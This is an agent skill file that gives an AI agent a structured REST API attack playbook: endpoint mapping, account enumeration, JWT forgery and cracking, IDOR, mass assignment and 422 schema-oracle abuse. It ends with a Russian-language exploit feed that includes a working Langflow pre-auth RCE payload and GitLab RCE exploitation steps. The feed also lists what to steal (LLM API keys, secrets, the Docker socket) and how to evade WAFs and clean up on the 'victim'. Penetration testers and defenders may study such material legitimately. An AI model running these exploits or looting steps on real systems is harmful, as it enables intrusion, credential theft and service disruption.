---
name: api-assault
description: Systematic REST API testing - endpoint matrix and status-code triage, auth flows and JWT analysis, IDOR, mass assignment, and 422 schema-oracle abuse. Use when the target exposes a JSON API or an OpenAPI spec.
---
SCOPE: authorized engagements only (lab / CTF / explicitly authorized targets). Follow the mission ROE and scope allow-list at all times.

Endpoint matrix first, payloads second - never spray-and-pray.

---

## REST API systematic testing

APIs get structured testing, never spray-and-pray. Rates per the web-assault SOP apply throughout: auth ≤3 attempts/min/account, WAF 429/403 → pause
60s, max 2 identical failed requests. Production: existence proof only —
no real user records pulled, no data modified; lab destructive=YES may
dump and modify.

## a) Endpoint matrix FIRST (before any payload)
1. Spec discovery on every live base:
   `curl -s https://<target>/openapi.json | jq '.info,.paths'`
   — also /swagger.json, /api-docs, /swagger/, /api/swagger.json.
2. JS bundle route extraction:
   `linkfinder.py -i "https://<target>/*.js" -o cli`
3. 405/404 differential: probe candidates with GET/POST/PUT/DELETE —
   405 proves the route; record to /work/<engagement>/api-matrix.md.

## b) Auth-flow systematics
- Map register / login / password-reset / resend / refresh flows.
- Account enumeration: response differential (status/body/message,
  existing vs unknown user) + timing — 5 samples per side, medians.
- Lockout probing stays inside ROE: ≤3 auth attempts/min per account,
  then switch account or endpoint. Never hammer.
- Token handling: record where tokens arrive (body/cookie/header), how
  they replay (`Authorization: Bearer <token>`), expiry behavior.

## c) JWT attacks (token captured → this order)
1. Decode: `echo <token> | cut -d. -f2 | base64 -d 2>/dev/null | jq`
2. alg:none — strip signature, set alg none, resend.
3. Algorithm confusion RS256→HS256 — re-sign with the server's PUBLIC
   key as HMAC secret: `python3 jwt_tool.py <token> -X k -pk <public.pem>`
4. Weak secret: `hashcat -m 16500 <jwt-file> <wordlist>` (rockyou).
5. kid/header injection: kid path traversal (../../dev/null → empty
   key), kid SQLi, jku/x5u → `https://<listener-url>/jwks.json`.
6. Expiry/audience skip: exp far-future; aud/iss removed.

## d) Session testing
- Cookie flags on every Set-Cookie: Secure/HttpOnly/SameSite — missing
  = finding.
- Fixation: does the pre-auth session cookie survive login?
- Token reuse across endpoints and role boundaries (user token on
  admin endpoint) — missing per-endpoint scope enforcement is the bug.

## e) IDOR + mass assignment
- Two owned accounts <user-a> <user-b>: call every object endpoint as
  A with B's ids (int and uuid forms); diff responses; 200 with B's
  data = IDOR. Horizontal first, then vertical (user → admin).
- Mass assignment: schema first, then add privileged fields (role,
  is_admin, user_id, price) one at a time to register/profile-update;
  verify by re-fetching the object.

## f) Schema-oracle abuse
- Malformed payloads: 422 validation responses enumerate required
  fields/types/formats for free — feed every revealed field into (e).

## g) OpenAPI-driven request matrix
- One request per documented endpoint × method × parameter: required
  valid-typed, optional fuzzed — the spec IS the checklist:
  `jq -r '.paths|to_entries[]|.key as $p|.value|keys[]|"\(.) \($p)"' openapi.json`

## h) Rate-limit probing discipline
- Measure, don't hammer: 5-request burst, note where 429 starts, back
  off 60s. The threshold IS the finding; pushing past it violates the core invariants.

## Evidence per attempt
One line per attempt in actions.log:
`<endpoint> | <payload-id> | <response-code> | <hypothesis>` — raw
request/response pairs to artifacts/.

## Rule
Never send a payload to an endpoint missing from the matrix — matrix
first, payloads second.

---

## Status-code triage and the 422 schema oracle

Map an unknown REST API by status code before attempting any auth bypass.
Send a bare GET and a bare POST to each candidate path and read the codes.

```
curl -s -o /dev/null -w '%{http_code}\n' hxxps://<host>/v1/<path>
curl -s -X POST hxxps://<host>/v1/<path>
```

Interpretation table:
- 405 on GET — endpoint exists, wrong method; retry with POST.
- 401 — auth gate present (bearer/session); note it, do not brute it yet.
- 422 — body required; the error payload is a schema oracle.
- 429 — rate limiting is active; slow down and note the control.

A 422 response that names required fields (e.g. event, surface, funnel_id)
leaks the request schema for free. Use it to build valid unauthenticated calls
and to identify telemetry or preview endpoints reachable without auth.

Probe with an empty body first:

```
curl -s -X POST hxxps://<host>/v1/<path> -H 'Content-Type: application/json' -d '{}'
```

The detail field often lists required parameters, their types and nested
object names. Distinguish 401 (auth gate) from 422 (schema oracle): a 422
means the route is reachable without credentials.

Use the leaked field names to build a valid request and test for abuse such as
telemetry flooding or enumeration. Record every unauthenticated route that
returns 422 as a candidate for rate-limit and input-validation review.

Framework fingerprint: a `{"detail": ...}` error body indicates FastAPI; a
rate-limit 429 behind a CDN usually means nginx sits in front of the app.

## Rule
Triage every API path by status code first — 405/401/422/429 each reveal method, auth, schema, and rate-limit posture without credentials. A 422 without auth is a schema leak; harvest field names before attempting any payload.

## Эксплойт-фид 2026-11-26 (research-проход #1)

### CVE-2026-97229 — GitLab CE/EE integer overflow в CI regex → RCE (KEV, CVSS 10.0)
- Фингерпринт: авторизованный `GET /api/v4/version` → 19.2.0–19.2.7, 19.3.0–19.3.3, 19.4.0–19.4.1; официальный Docker/Omnibus linux/amd64 (19.3.4 уже содержит фикс Ruby — неэксплуатируем).
- Форма запроса: (1) с токеном пользователя — коммит `.gitlab-ci.yml` с `rules: exists: regexp: <паттерн ~2 ГиБ>` в публичный проект; (2) БЕЗ аутентификации `GET /api/v4/projects/:id/ci/lint?content_ref=<branch>` → integer overflow в Onigmo → перехват управления в Puma-воркере.
- Гейт: аккаунт с push в публичный проект (open registration), ≥10 ГиБ RAM контейнера, версия в affected-диапазоне и известная pcode-раскладка.
- Подводные камни: каждый выстрел аллоцирует >2 ГиБ и убивает Puma-воркер (HTTP 502) — заметный DoS-след; слот команды 28 байт (fetch/curl-стейджинг); свои сборки GitLab вне раскладок не поддерживаются.
- Пост-эксплойт: exec от `git` → чтение секретов GitLab, доступ ко всем проектам/токенам, пивот на shared runners (RCE хостов раннеров).
- Клинап: модуль MSF сам удаляет временный PAT и ветку; проверить GitLab threat detections (6 в патч-релизе) и перезапустить воркеры.

### CVE-2025-3248 — Langflow pre-auth RCE (KEV, ransomware-linked)
- Фингерпринт: веб-UI на :7860; `POST /api/v1/validate/code` без токена → 200 JSON `function`.
- Запрос: `{"code": "def x(cmd=exec(\"raise Exception(__import__('subprocess').check_output('<cmd>', shell=True))\")):\n  pass"}` — вывод команды вернётся в `function.errors[0]` как b'...'.
- Гейт: langflow < 1.3.0 без auth-прокси; в 1.3.0 эндпоинт закрыт.
- Подводные камни: WAF-сигнатура validate/code+subprocess; тройное экранирование кавычек; контейнер часто root.
- Клинап: stateless, артефактов нет; не менять флоу жертвы.
- Забрать: LLM API-ключи из env, секреты Langflow, Docker-сокет если смонтирован.
